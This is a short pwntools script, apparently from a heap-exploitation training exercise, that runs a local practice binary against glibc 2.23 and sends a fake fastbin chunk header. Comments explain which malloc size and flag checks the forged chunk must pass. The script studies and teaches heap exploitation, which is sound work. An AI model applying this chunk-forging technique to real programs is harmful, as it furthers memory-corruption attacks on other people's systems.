from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.fix_fastbin'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/
''')


# This field does not matter because the fastbin chunks do not deal with the consolidation process.
prev_size = p64(0x0)
'''
0x50: Fastbin chunks sizes must match the bin size when being removed. Almost anything that is not between 0x50 to 0x5f will not work because of this issue (more on this later).
Flags: 
	- 0: PREV_INUSE: 
		- Is the previous chunk in use? Well, sorta... the first chunk ALWAYS has the prev_inuse bit set to 1.
		- So, to be accurate, we set this bit.
		- In reality, this bit DOES NOT have to be set, because the chunk (in the fastbin) does not take in consolidation steps at this point. So, even if it was not set, nothing bad happens.
		- In fact, having ALL of the flags set will still make this work!
	- 1: This is NOT mmapped memory (do not set the value then) 
	- 2: This is the main arena (don't set the value then)

What does and what won't work? 
- A validation check is ran in order to determine if the chunk is valid or not: 	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2051
- In practically, you need to worry about two things: 
	- The size is the same as the bin
	- The chunk is NOT mmaped AND a non-main arena chunk.
		- As long as both these bits are not set, then the security check passes.
		- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2057
'''

# prev_inuse bit should be set. But, it will work either way.

size = p64(0x50 + 0x1)
p.sendline(prev_size + size)

p.interactive()
